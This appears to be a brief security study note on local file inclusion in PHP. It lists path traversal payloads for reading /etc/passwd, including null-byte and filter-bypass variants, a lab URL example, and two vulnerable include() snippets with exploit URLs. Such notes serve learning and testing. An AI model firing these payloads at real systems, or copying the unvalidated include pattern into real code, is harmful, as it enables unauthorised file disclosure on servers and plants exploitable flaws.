# LFI

## Payloads

```shell
../../../../etc/passwd
../../../../etc/passwd/.
../../../../etc/passwd%00
....//....//....//....//....//etc/passwd

Example:
http://10.10.13.178/lab6.php?file=THM-profile/../../../../etc/os-release%00
```

## Case 1 | Basic Get request

```php
<?PHP 
	include($_GET["lang"]);
?>
```
A `GET` request via URL parameter `lang` to include the file of the page. This can be calld with:  
`http://homepage.com/index.php?lang=EN.php` to load the `EN.php`.

If there isn't a input validatione, we can read any file e.g. `/etc/passwd`. We can try the following:   
`http://homepage.com/get.php?file=/etc/passwd`.
That is possible because the `include` function has no validation.

## Case 2 | Given directory

```php
<?PHP 
	include("languages/". $_GET['lang']); 
?>
```

The directory is given but if there is no input validation, we can `path traversal` with the following payload  
`http://homepage/index.php?lang=../../../../etc/passwd`